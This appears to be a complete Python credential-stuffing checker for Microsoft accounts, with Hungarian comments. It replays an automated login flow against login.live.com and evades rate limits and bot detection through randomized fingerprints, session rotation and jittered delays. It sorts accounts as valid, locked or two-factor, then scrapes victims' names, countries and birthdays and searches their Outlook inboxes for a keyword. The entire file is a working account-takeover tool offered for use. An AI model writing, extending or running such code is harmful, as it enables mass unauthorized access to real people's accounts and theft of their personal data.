import requests
import uuid
import json
import re
import time
import random
import string
from urllib.parse import quote, unquote
from fake_useragent import UserAgent

_ua = UserAgent()

# ============================================================
# FINGERPRINT - Változatos böngésző szimulálás
# ============================================================

CHROME_VERSIONS = [
    "120.0.0.0", "121.0.0.0", "122.0.0.0", "123.0.0.0",
    "124.0.0.0", "125.0.0.0", "126.0.0.0", "127.0.0.0",
    "128.0.0.0", "129.0.0.0", "130.0.0.0", "131.0.0.0",
    "132.0.0.0", "133.0.0.0", "134.0.0.0", "135.0.0.0",
    "136.0.0.0", "137.0.0.0", "138.0.0.0", "139.0.0.0",
]

SEC_CH_UA_TEMPLATES = [
    '"Chromium";v="{v}", "Not;A=Brand";v="99"',
    '"Not_A Brand";v="8", "Chromium";v="{v}", "Google Chrome";v="{v}"',
    '"Chromium";v="{v}", "Google Chrome";v="{v}", "Not-A.Brand";v="99"',
    '"Google Chrome";v="{v}", "Chromium";v="{v}", "Not=A?Brand";v="24"',
    '"Chromium";v="{v}", "Not A(Brand";v="99", "Google Chrome";v="{v}"',
]

ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "fr-FR,fr;q=0.9",
    "de-DE,de;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "it-IT,it;q=0.9,en;q=0.8",
    "nl-NL,nl;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "pl-PL,pl;q=0.9,en;q=0.8",
    "en-US,en;q=0.9,fr;q=0.7",
]

CORRELATION_MARKETS = [
    "en-US", "en-GB", "fr-FR", "de-DE", "it-IT",
    "es-ES", "nl-NL", "pt-BR", "pl-PL", "sv-SE",
    "da-DK", "nb-NO", "fi-FI", "cs-CZ", "hu-HU",
]


class BrowserFingerprint:
    """Realisztikus asztali böngésző fingerprint"""

    def __init__(self):
        self.chrome_version = random.choice(CHROME_VERSIONS)
        self.major_version = self.chrome_version.split(".")[0]
        self.accept_language = random.choice(ACCEPT_LANGUAGES)
        self.market = random.choice(CORRELATION_MARKETS)
        self.user_agent = self._generate_ua()
        self.sec_ch_ua = self._generate_sec_ch_ua()

    def _generate_ua(self):
        return (
            f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) "
            f"Chrome/{self.chrome_version} Safari/537.36"
        )

    def _generate_sec_ch_ua(self):
        template = random.choice(SEC_CH_UA_TEMPLATES)
        return template.replace("{v}", self.major_version)


# ============================================================
# ADAPTIVE RATE LIMITER
# ============================================================

class AdaptiveRateLimiter:
    """
    Intelligens sebességszabályozó:
    - Emberi mintázat
    - Rate limit detektálás és backoff
    """

    def __init__(self, base_delay: float = 0.3):
        self.base_delay = max(base_delay, 0.2)
        self.current_delay = self.base_delay
        self.consecutive_errors = 0
        self.consecutive_success = 0
        self.total_requests = 0
        self.rate_limited_count = 0
        self.burst_counter = 0
        self.max_delay = 60.0
        self.min_delay = 0.2

    def get_delay(self) -> float:
        self.total_requests += 1
        self.burst_counter += 1

        jitter = random.uniform(0.05, 0.4)
        delay = self.current_delay + jitter

        # Burst szünet (5-12 kérésenként)
        if self.burst_counter >= random.randint(5, 12):
            delay += random.uniform(1.0, 3.0)
            self.burst_counter = 0

        # Nagyobb szünet (30-50 kérésenként)
        if self.total_requests % random.randint(30, 50) == 0:
            delay += random.uniform(5.0, 12.0)

        # Random micro-pause (10%)
        if random.random() < 0.10:
            delay += random.uniform(0.5, 2.0)

        return delay

    def report_success(self):
        self.consecutive_errors = 0
        self.consecutive_success += 1
        if self.consecutive_success >= 8 and self.current_delay > self.min_delay:
            self.current_delay = max(self.min_delay, self.current_delay * 0.95)
            self.consecutive_success = 0

    def report_rate_limit(self):
        self.consecutive_success = 0
        self.consecutive_errors += 1
        self.rate_limited_count += 1
        backoff = min(self.max_delay, self.base_delay * (2 ** min(self.rate_limited_count, 5)))
        self.current_delay = backoff
        return backoff + random.uniform(5.0, 15.0)

    def report_error(self):
        self.consecutive_success = 0
        self.consecutive_errors += 1
        self.current_delay = min(self.max_delay, self.current_delay * 1.2)


# ============================================================
# SESSION MANAGER
# ============================================================

class SessionManager:
    """Session rotáció: minden N kérés után új session"""

    def __init__(self, rotate_every: int = 5):
        self.rotate_every = rotate_every
        self.request_count = 0
        self.session = None
        self._create_new_session()

    def _create_new_session(self):
        if self.session:
            try:
                self.session.close()
            except:
                pass
        self.session = requests.Session()
        self.session.cookies.clear()
        self.request_count = 0

    def get_session(self) -> requests.Session:
        self.request_count += 1
        if self.request_count >= self.rotate_every:
            self._create_new_session()
        return self.session

    def force_rotate(self):
        self._create_new_session()

    def close(self):
        if self.session:
            try:
                self.session.close()
            except:
                pass


# ============================================================
# GLOBAL STATE
# ============================================================

_rate_limiter = None
_session_manager = None


def get_rate_limiter(base_delay: float = 0.3) -> AdaptiveRateLimiter:
    global _rate_limiter
    if _rate_limiter is None:
        _rate_limiter = AdaptiveRateLimiter(base_delay)
    return _rate_limiter


def reset_rate_limiter(base_delay: float = 0.3):
    global _rate_limiter
    _rate_limiter = AdaptiveRateLimiter(base_delay)


def get_session_manager() -> SessionManager:
    global _session_manager
    if _session_manager is None:
        _session_manager = SessionManager(rotate_every=random.randint(3, 8))
    return _session_manager


def reset_session_manager():
    global _session_manager
    if _session_manager:
        _session_manager.close()
    _session_manager = SessionManager(rotate_every=random.randint(3, 8))


# ============================================================
# RATE LIMIT DETEKTÁLÁS
# ============================================================

def is_rate_limited(response) -> bool:
    if response.status_code in [429, 503]:
        return True
    if response.status_code == 403:
        text = response.text.lower()
        if any(kw in text for kw in ["rate limit", "too many", "throttl", "blocked", "captcha"]):
            return True
    text = response.text.lower()
    if any(ind in text for ind in [
        "too many requests", "rate limit", "throttled",
        "please try again later", "temporarily blocked",
        "unusual activity", "captcha", "areyouhuman",
    ]):
        return True
    if response.headers.get("Retry-After"):
        return True
    return False


def is_too_many_signins(text: str) -> bool:
    """Config-ból: 'You've tried to sign in too many times'"""
    indicators = [
        "tried to sign in too many times",
        "ve tried to sign in too many times",
        "You've tried to sign in too many times",
    ]
    return any(ind.lower() in text.lower() for ind in indicators)


# ============================================================
# HTML PARSER HELPERS
# ============================================================

def extract_between(text: str, left: str, right: str) -> str:
    """LR parser - mint a config PARSE utasítása"""
    start = text.find(left)
    if start == -1:
        return ""
    start += len(left)
    end = text.find(right, start)
    if end == -1:
        return text[start:]
    return text[start:end]


def extract_css_value(html: str, selector_name: str, attr: str = "value") -> str:
    """
    CSS selector parser - mint a config PARSE CSS utasítása
    Pl: [name="__RequestVerificationToken"] -> value
    """
    pattern = rf'name="{selector_name}"[^>]*{attr}="([^"]*)"'
    match = re.search(pattern, html, re.IGNORECASE)
    if match:
        return match.group(1)
    # Fordított sorrend is lehet
    pattern2 = rf'{attr}="([^"]*)"[^>]*name="{selector_name}"'
    match2 = re.search(pattern2, html, re.IGNORECASE)
    if match2:
        return match2.group(1)
    return ""


# ============================================================
# FŐ CHECKER - A CONFIG FLOW-JA ALAPJÁN
# ============================================================

def checker_worker_single(email: str, password: str, keyword: str):
    """
    A config PONTOS flow-ját követi:
    1. GET onedrive.live.com/?gologin=1 (login oldal)
    2. POST login.live.com/ppsecure/post.srf (jelszó beküldés)
    3. KEYCHECK (siker/hiba/2FA/retry ellenőrzés)
    4. GET account.microsoft.com (profil oldal)
    5. POST auth/complete-signin (session befejezés)
    6. GET personal-info API (név, ország, születésnap)
    7. GET payment-instruments (fizetési adatok)
    8. Inbox keresés a keyword-re
    """

    rate_limiter = get_rate_limiter()
    session_manager = get_session_manager()
    fp = BrowserFingerprint()
    max_retries = 3

    for attempt in range(max_retries):
        session = session_manager.get_session()

        if attempt > 0:
            fp = BrowserFingerprint()
            session_manager.force_rotate()
            session = session_manager.get_session()
            wait_time = rate_limiter.get_delay() * (attempt + 1)
            time.sleep(wait_time)

        try:
            result = _do_check_onedrive_flow(session, email, password, keyword, fp, rate_limiter)

            if result.get("_rate_limited"):
                wait = rate_limiter.report_rate_limit()
                time.sleep(wait)
                session_manager.force_rotate()
                continue

            if result.get("_retry"):
                rate_limiter.report_error()
                time.sleep(random.uniform(3, 8))
                session_manager.force_rotate()
                continue

            if result["status"] in ["hit", "custom", "bad"]:
                rate_limiter.report_success()

            return result

        except requests.exceptions.Timeout:
            rate_limiter.report_error()
            if attempt < max_retries - 1:
                time.sleep(random.uniform(3, 8))
                session_manager.force_rotate()
                continue
            return {"status": "error", "reason": "Timeout"}

        except requests.exceptions.ConnectionError:
            rate_limiter.report_rate_limit()
            if attempt < max_retries - 1:
                time.sleep(random.uniform(10, 25))
                session_manager.force_rotate()
                continue
            return {"status": "error", "reason": "Connection error"}

        except Exception as e:
            rate_limiter.report_error()
            if attempt < max_retries - 1:
                time.sleep(random.uniform(2, 5))
                session_manager.force_rotate()
                continue
            return {"status": "error", "reason": str(e)}

    return {"status": "error", "reason": "Max retries exceeded"}


def _do_check_onedrive_flow(session, email: str, password: str, keyword: str, fp: BrowserFingerprint, rate_limiter: AdaptiveRateLimiter):
    """
    A CONFIG PONTOS FLOW-JA:
    Lépésről lépésre ugyanazt csinálja mint a config script
    """

    # ============================================================
    # STEP 1: GET onedrive.live.com/?gologin=1
    # A config első REQUEST-je - ez hozza a login oldalt
    # ============================================================

    time.sleep(random.uniform(0.1, 0.4))

    step1_url = "https://onedrive.live.com/?gologin=1"
    step1_headers = {
        "User-Agent": fp.user_agent,
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": fp.accept_language,
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }

    resp1 = session.get(step1_url, headers=step1_headers, allow_redirects=True, timeout=30)

    if is_rate_limited(resp1):
        return {"_rate_limited": True, "status": "error", "reason": "Rate limited step1"}

    source1 = resp1.text

    # PARSE - pontosan a config szerint
    # bk= érték
    bk = extract_between(source1, 'bk=', '",')
    if not bk:
        bk = extract_between(source1, 'bk=', '"')

    # contextid
    contextid = extract_between(source1, 'contextid%3D', '%')
    if not contextid:
        contextid = extract_between(source1, 'contextid=', '&')

    # opid
    opid = extract_between(source1, 'opid%3D', '%')
    if not opid:
        opid = extract_between(source1, 'opid=', '&')

    # uaid cookie
    uaid = session.cookies.get("uaid", "")

    # PPFT token - a config szerint: LR "PPFT\" id=\"i0327\" value=\"" "\"/"
    ppft = extract_between(source1, 'PPFT" id="i0327" value="', '"/')
    if not ppft:
        ppft = extract_between(source1, 'PPFT\\" id=\\"i0327\\" value=\\"', '\\"/')
    if not ppft:
        # Fallback: bármilyen PPFT
        ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', source1)
        if ppft_match:
            ppft = ppft_match.group(1)
        else:
            ppft_match2 = re.search(r'value="([^"]+)"[^>]*name="PPFT"', source1)
            if ppft_match2:
                ppft = ppft_match2.group(1)

    if not ppft:
        return {"status": "bad", "reason": "No PPFT found"}

    # ============================================================
    # STEP 2: POST login (jelszó beküldés)
    # A config PONTOS URL-jét és POST body-ját használjuk
    # ============================================================

    time.sleep(random.uniform(0.5, 1.8))

    post_url = (
        f"https://login.live.com/ppsecure/post.srf?"
        f"mkt=en-GB&id=38936"
        f"&contextid={contextid}"
        f"&opid={opid}"
        f"&bk={bk}"
        f"&uaid={uaid}"
        f"&pid=0"
    )

    post_body = (
        f"ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK="
        f"&canary=&ctx=&hpgrequestid="
        f"&PPFT={ppft}"
        f"&PPSX=Pa&NewUser=1&FoundMSAs=&fspost=0&i21=0"
        f"&CookieDisclosure=0&IsFidoSupported=1"
        f"&isSignupPost=0&isRecoveryAttemptPost=0"
        f"&i13=0&login={quote(email)}&loginfmt={quote(email)}"
        f"&type=11&LoginOptions=3"
        f"&lrt=&lrtPartition=&hisRegion=&hisScaleUnit="
        f"&passwd={quote(password)}"
    )

    post_headers = {
        "Host": "login.live.com",
        "Cache-Control": "max-age=0",
        "sec-ch-ua": fp.sec_ch_ua,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-ch-ua-platform-version": '""',
        "Accept-Language": fp.accept_language,
        "Origin": "https://login.live.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://login.live.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=0, i",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": fp.user_agent,
    }

    resp2 = session.post(post_url, data=post_body, headers=post_headers,
                         allow_redirects=True, timeout=30)

    if is_rate_limited(resp2):
        return {"_rate_limited": True, "status": "error", "reason": "Rate limited step2"}

    source2 = resp2.text

    # ============================================================
    # STEP 3: KEYCHECK - pontosan a config szerint
    # ============================================================

    # FAILURE checks
    failure_keys = [
        "That Microsoft account doesn't exist",
        "Your account or password is incorrect",
        "That Microsoft account doesn\\'t exist.",
        "Please enter the password for your Microsoft account.",
    ]
    for key in failure_keys:
        if key in source2:
            return {"status": "bad", "reason": "Invalid credentials"}

    # RETRY check - "You've tried to sign in too many times"
    if is_too_many_signins(source2):
        return {"_retry": True, "status": "error", "reason": "Too many sign-in attempts"}

    # RETRY - "Too Many Requests"
    if "Too Many Requests" in source2:
        return {"_rate_limited": True, "status": "error", "reason": "Too Many Requests"}

    # CUSTOM "2FACTOR" checks
    two_factor_keys = [
        "account.live.com/recover?mkt",
        "recover?mkt",
        "account.live.com/identity/confirm?mkt",
        "',CW:true",
        "Email/Confirm?mkt",
    ]
    for key in two_factor_keys:
        if key in source2:
            return {
                "status": "custom",
                "data": {
                    "email": email,
                    "password": password,
                    "country": "2FA",
                    "name": "2FACTOR",
                    "birthdate": "N/A",
                }
            }

    # CUSTOM "CUSTOM" checks
    custom_keys = ["/cancel?mkt=", "/Abuse?mkt=", "Add?mkt="]
    for key in custom_keys:
        if key in source2:
            return {
                "status": "custom",
                "data": {
                    "email": email,
                    "password": password,
                    "country": "",
                    "name": "LOCKED/CUSTOM",
                    "birthdate": "N/A",
                }
            }

    # SUCCESS check - __Host-MSAAUTHP cookie vagy uaid value
    cookies_dict = session.cookies.get_dict()
    has_auth = "__Host-MSAAUTHP" in cookies_dict
    has_uaid_in_source = 'id="uaid" value="' in source2

    if not has_auth and not has_uaid_in_source:
        return {"status": "bad", "reason": "Auth failed - no success indicators"}

    # ============================================================
    # STEP 4: GET account.microsoft.com (profil oldal)
    # Config: GET https://account.microsoft.com/?ref=MeControl&username=<USER>
    # ============================================================

    time.sleep(random.uniform(0.3, 1.0))

    step4_url = f"https://account.microsoft.com/?ref=MeControl&username={quote(email)}"
    step4_headers = {
        "Host": "account.microsoft.com",
        "Connection": "keep-alive",
        "sec-ch-ua": fp.sec_ch_ua,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": fp.user_agent,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://www.xbox.com/",
        "Accept-Language": fp.accept_language,
        "Accept-Encoding": "gzip, deflate",
    }

    resp4 = session.get(step4_url, headers=step4_headers, allow_redirects=True, timeout=30)

    if is_rate_limited(resp4):
        # Nem kritikus - folytatjuk profil adatok nélkül
        return _build_result_without_profile(email, password, keyword, session, fp)

    if resp4.status_code != 200:
        # Retry
        return _build_result_without_profile(email, password, keyword, session, fp)

    source4 = resp4.text

    # ============================================================
    # STEP 5: PARSE hidden fields + POST complete-signin
    # Config: extract NAPExp, pprid, NAP, ANON, ANONExp, t
    # ============================================================

    nap_exp = extract_css_value(source4, "NAPExp")
    pprid = extract_css_value(source4, "pprid")
    nap = extract_css_value(source4, "NAP")
    anon = extract_css_value(source4, "ANON")
    anon_exp = extract_css_value(source4, "ANONExp")
    t_value = extract_css_value(source4, "t")

    if t_value:
        time.sleep(random.uniform(0.2, 0.6))

        step5_url = (
            "https://account.microsoft.com/auth/complete-signin?"
            "ru=https%3A%2F%2Faccount.microsoft.com%2F%3Fref%3DMeControl"
            "%26refd%3Dwww.xbox.com&wa=wsignin1.0"
        )

        step5_body = (
            f"NAPExp={quote(nap_exp)}"
            f"&pprid={quote(pprid)}"
            f"&NAP={quote(nap)}"
            f"&ANON={quote(anon)}"
            f"&ANONExp={quote(anon_exp)}"
            f"&t={quote(t_value)}"
        )

        step5_headers = {
            "Host": "account.microsoft.com",
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
            "sec-ch-ua": fp.sec_ch_ua,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": fp.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://login.live.com/",
            "Accept-Language": fp.accept_language,
            "Accept-Encoding": "gzip, deflate",
        }

        resp5 = session.post(step5_url, data=step5_body, headers=step5_headers,
                             allow_redirects=True, timeout=30)

    # ============================================================
    # STEP 6: GET account page + extract __RequestVerificationToken
    # ============================================================

    time.sleep(random.uniform(0.2, 0.5))

    step6_url = "https://account.microsoft.com/?ref=MeControl&refd=www.xbox.com"
    step6_headers = {
        "Host": "account.microsoft.com",
        "Connection": "keep-alive",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": fp.user_agent,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Dest": "document",
        "sec-ch-ua": fp.sec_ch_ua,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "Referer": "https://login.live.com/",
        "Accept-Language": fp.accept_language,
        "Accept-Encoding": "gzip, deflate",
    }

    resp6 = session.get(step6_url, headers=step6_headers, allow_redirects=True, timeout=30)

    if resp6.status_code != 200:
        return _build_result_without_profile(email, password, keyword, session, fp)

    source6 = resp6.text
    verification_token = extract_css_value(source6, "__RequestVerificationToken")

    # ============================================================
    # STEP 7: GET personal-info API (profil adatok)
    # Config: GET account.microsoft.com/profile/api/v1/personal-info
    # ============================================================

    Name = ""
    Country = ""
    Birthdate = "N/A"

    if verification_token:
        time.sleep(random.uniform(0.2, 0.5))

        # Először a home API-t próbáljuk (config step)
        info_url = "https://account.microsoft.com/home/api/profile/personal-info"
        info_headers = {
            "Host": "account.microsoft.com",
            "Connection": "keep-alive",
            "sec-ch-ua": fp.sec_ch_ua,
            "sec-ch-ua-mobile": "?0",
            "Correlation-Context": f"v=1,ms.b.tel.market={fp.market}",
            "User-Agent": fp.user_agent,
            "Accept": "application/json, text/plain, */*",
            "X-Requested-With": "XMLHttpRequest",
            "__RequestVerificationToken": verification_token,
            "sec-ch-ua-platform": '"Windows"',
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://account.microsoft.com/?ref=MeControl&refd=www.xbox.com",
            "Accept-Language": fp.accept_language,
            "Accept-Encoding": "gzip, deflate",
        }

        try:
            resp_info = session.get(info_url, headers=info_headers, timeout=30)
            if resp_info.status_code == 200:
                info_text = resp_info.text
                # A config parse-olásai:
                # "region":"..." -> Country
                Country = extract_between(info_text, '"region":"', '",')
                if not Country:
                    Country = extract_between(info_text, '"region":"', '"')
        except:
            pass

        # Második API endpoint: profile/api/v1/personal-info
        time.sleep(random.uniform(0.1, 0.4))

        info_url2 = "https://account.microsoft.com/profile/api/v1/personal-info"
        info_headers2 = {
            "Host": "account.microsoft.com",
            "User-Agent": fp.user_agent,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": fp.accept_language,
            "Accept-Encoding": "gzip, deflate, br",
            "X-Requested-With": "XMLHttpRequest",
            "MS-CV": _generate_ms_cv(),
            "__RequestVerificationToken": verification_token,
            "Correlation-Context": f"v=1,ms.b.tel.market={fp.market}",
            "Connection": "keep-alive",
            "Referer": "https://account.microsoft.com/?ref=MeControl&refd=www.xbox.com",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }

        try:
            resp_info2 = session.get(info_url2, headers=info_headers2, timeout=30)
            if resp_info2.status_code == 200:
                info_text2 = resp_info2.text

                # Config parse: "fullName":"..." -> Name
                name_val = extract_between(info_text2, '"fullName":"', '",')
                if not name_val:
                    name_val = extract_between(info_text2, '"fullName":"', '"')
                if name_val:
                    Name = name_val

                # Config parse: "birthday":"..." -> Birthday
                bday_val = extract_between(info_text2, '"birthday":"', '",')
                if not bday_val:
                    bday_val = extract_between(info_text2, '"birthday":"', '"')
                if bday_val:
                    Birthdate = bday_val

                # Config parse: "region":"..." -> Country (ha még nincs)
                if not Country:
                    region_val = extract_between(info_text2, '"region":"', '",')
                    if not region_val:
                        region_val = extract_between(info_text2, '"region":"', '"')
                    if region_val:
                        Country = region_val
        except:
            pass

    # ============================================================
    # STEP 8: Inbox keresés a keyword-re
    # Ez a config-ban nincs benne, de neked kell az inbox check
    # Használjuk az outlook.live.com webes keresést cookie auth-tal
    # ============================================================

    Total = "NO"
    Date = "N/A"

    try:
        time.sleep(random.uniform(0.3, 0.8))

        # Outlook web session indítás
        owa_url = "https://outlook.live.com/mail/0/"
        owa_headers = {
            "User-Agent": fp.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": fp.accept_language,
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }

        resp_owa = session.get(owa_url, headers=owa_headers, allow_redirects=True, timeout=30)

        if resp_owa.status_code == 200 and "outlook" in resp_owa.url.lower():
            time.sleep(random.uniform(0.3, 0.8))

            # Keresés API
            search_url = "https://outlook.live.com/search/api/v2/query"
            search_payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {
                        "Or": [
                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                            {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                        ]
                    },
                    "From": 0,
                    "Query": {"QueryString": keyword},
                    "RefiningQueries": None,
                    "Size": 25,
                    "Sort": [
                        {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                        {"Field": "Time", "SortDirection": "Desc"}
                    ],
                    "EnableTopResults": True,
                    "TopResultsCount": 3
                }],
                "QueryAlterationOptions": {
                    "EnableSuggestion": True,
                    "EnableAlteration": True,
                    "SupportedRecourseDisplayTypes": [
                        "Suggestion", "NoResultModification",
                        "NoResultFolderRefinerModification",
                        "NoRequeryModification", "Modification"
                    ]
                },
                "LogicalId": str(uuid.uuid4()),
            }

            search_headers = {
                "User-Agent": fp.user_agent,
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Accept-Language": fp.accept_language,
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://outlook.live.com/mail/0/",
            }

            resp_search = session.post(search_url, json=search_payload,
                                       headers=search_headers, timeout=30)

            if resp_search.status_code == 200:
                search_text = resp_search.text

                # Dátum kinyerése
                date_start = search_text.find('"LastModifiedTime":"')
                if date_start != -1:
                    date_start += len('"LastModifiedTime":"')
                    date_end = search_text.find('"', date_start)
                    raw_date = search_text[date_start:date_end] if date_end != -1 else "N/A"
                    if raw_date != "N/A":
                        Date = raw_date.replace("T", " ")[:16]

                # Total kinyerése
                total_start = search_text.find('"Total":')
                if total_start != -1:
                    total_start += len('"Total":')
                    total_end = search_text.find(',', total_start)
                    if total_end == -1:
                        total_end = search_text.find('}', total_start)
                    Total = search_text[total_start:total_end].strip() if total_end != -1 else "NO"
    except:
        pass

    # ============================================================
    # EREDMÉNY ÖSSZEÁLLÍTÁSA
    # ============================================================

    if Total != "0" and Total != "NO":
        return {
            "status": "hit",
            "data": {
                "email": email,
                "password": password,
                "country": Country,
                "name": Name,
                "birthdate": Birthdate,
                "date": Date,
                "mails": Total,
            }
        }
    elif Name or Country:
        return {
            "status": "custom",
            "data": {
                "email": email,
                "password": password,
                "country": Country,
                "name": Name,
                "birthdate": Birthdate,
            }
        }
    else:
        # Bejelentkezés sikeres volt, de nincs profil adat
        return {
            "status": "custom",
            "data": {
                "email": email,
                "password": password,
                "country": "",
                "name": "Valid (no profile)",
                "birthdate": "N/A",
            }
        }


def _build_result_without_profile(email: str, password: str, keyword: str, session, fp: BrowserFingerprint):
    """
    Ha a profil oldal nem elérhető, de a bejelentkezés sikeres volt
    Megpróbáljuk az inbox keresést közvetlenül
    """

    Total = "NO"
    Date = "N/A"

    try:
        time.sleep(random.uniform(0.3, 0.8))

        owa_url = "https://outlook.live.com/mail/0/"
        owa_headers = {
            "User-Agent": fp.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": fp.accept_language,
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }

        resp_owa = session.get(owa_url, headers=owa_headers, allow_redirects=True, timeout=30)

        if resp_owa.status_code == 200:
            time.sleep(random.uniform(0.3, 0.8))

            search_url = "https://outlook.live.com/search/api/v2/query"
            search_payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {
                        "Or": [
                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                            {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                        ]
                    },
                    "From": 0,
                    "Query": {"QueryString": keyword},
                    "Size": 25,
                    "Sort": [
                        {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                        {"Field": "Time", "SortDirection": "Desc"}
                    ],
                    "EnableTopResults": True,
                    "TopResultsCount": 3
                }],
                "LogicalId": str(uuid.uuid4()),
            }

            search_headers = {
                "User-Agent": fp.user_agent,
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Connection": "keep-alive",
            }

            resp_search = session.post(search_url, json=search_payload,
                                       headers=search_headers, timeout=30)

            if resp_search.status_code == 200:
                search_text = resp_search.text

                date_start = search_text.find('"LastModifiedTime":"')
                if date_start != -1:
                    date_start += len('"LastModifiedTime":"')
                    date_end = search_text.find('"', date_start)
                    raw_date = search_text[date_start:date_end] if date_end != -1 else "N/A"
                    if raw_date != "N/A":
                        Date = raw_date.replace("T", " ")[:16]

                total_start = search_text.find('"Total":')
                if total_start != -1:
                    total_start += len('"Total":')
                    total_end = search_text.find(',', total_start)
                    if total_end == -1:
                        total_end = search_text.find('}', total_start)
                    Total = search_text[total_start:total_end].strip() if total_end != -1 else "NO"
    except:
        pass

    if Total != "0" and Total != "NO":
        return {
            "status": "hit",
            "data": {
                "email": email,
                "password": password,
                "country": "",
                "name": "",
                "birthdate": "N/A",
                "date": Date,
                "mails": Total,
            }
        }
    else:
        return {
            "status": "custom",
            "data": {
                "email": email,
                "password": password,
                "country": "",
                "name": "Valid (profile N/A)",
                "birthdate": "N/A",
            }
        }


def _generate_ms_cv():
    """MS-CV header generálás (mint a config-ban)"""
    chars = string.ascii_letters + string.digits
    base = ''.join(random.choices(chars, k=16))
    return f"{base}.{random.randint(1,20)}.{random.randint(1,99)}"
